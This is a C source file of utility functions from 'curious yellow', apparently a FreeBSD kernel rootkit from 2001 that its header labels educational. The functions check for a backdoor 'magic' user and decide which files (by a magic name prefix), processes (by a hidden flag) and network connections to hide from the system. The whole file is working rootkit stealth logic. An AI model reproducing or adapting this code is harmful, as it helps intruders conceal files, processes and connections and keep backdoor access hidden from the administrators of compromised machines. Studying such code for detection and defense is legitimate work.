/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    Utility functions for curious yellow. 
 *
 *    This software is written for educational purposes only.
 *
 *    $Id: util.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 */

#include <sys/param.h> 
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/malloc.h>
#include <sys/sysproto.h>
#include <sys/sysent.h>
#include <sys/proc.h>
#include <sys/lock.h>
#include <sys/module.h>
#include <sys/linker.h>
#include <sys/fcntl.h>   
#include <sys/libkern.h>   
#include <sys/namei.h>
#include <sys/sysctl.h>
#include <sys/linker.h>
#include <sys/queue.h>
#include <machine/elf.h>
#include <machine/limits.h>

#include "../config.h"
#include "util.h"
#include "control.h"

extern linker_file_list_t linker_files;
extern unsigned long elf_hash(const char *);

extern uid_t magic_uid;
extern int hidden_cons;

extern LIST_HEAD(head_conn, list_conn) lh_conn;



/*
 * is_magic_user - check if the user is the magic user of cy
 */
 
int
is_magic_user(uid_t uid)
{
    if((magic_uid == uid) && (magic_uid != ULONG_MAX))
        return(1);
 
    return(0);
}


/*
 * file_hidden - check if the file with the given name should
 * be hidden (eg starts with MAGICSTRING)
 */

#if defined(FILE_SYSCALLS) || defined(FILE_UFS)

int
file_hidden(char *name)
{
    char buf[MAGICLENGTH + 1];

    bcopy(name,buf,MAGICLENGTH);
    buf[MAGICLENGTH] = '\0';

    /* compare the start with magicstring */
    if(!strcmp(buf,MAGICSTRING))
        return(1);

    return(0);
}

#endif

  
/*
 * pid_hidden   - check if process with given pid is hidden
 */
 
#ifdef PROCESS_HACKS

int
pid_hidden(pid_t pid)
{
    struct proc *process;
 
    /* find process with given pid */
    if((process = pfind(pid)) == NULL)
        return(0);
 
    /* check if process is hidden */
    if(process->p_flag & P_HIDDEN)
        return(1);
 
    return(0);
} 

#endif

/*
 * net_hidden - check if the network connection with the given
 * src ip, src port and dst ip, dst port should be hidden
 */

#ifdef NETSTAT_HACK

int
net_hidden(u_int32_t l_ip, ushort l_port, u_int32_t r_ip, ushort r_port)
{
    struct list_conn *entry;

    LIST_FOREACH(entry, &lh_conn, list) {

        if(((entry->conn.l_ip == l_ip) || (entry->conn.l_ip == 0)) &&
            ((entry->conn.l_port == l_port) || (entry->conn.l_port == 0)) &&
            ((entry->conn.r_ip == r_ip) || (entry->conn.r_ip == 0)) &&
            ((entry->conn.r_port == r_port) || (entry->conn.r_port == 0)))
            return(1);
    }

    /* no match found, so don't hide */
    return(0);
}

#endif

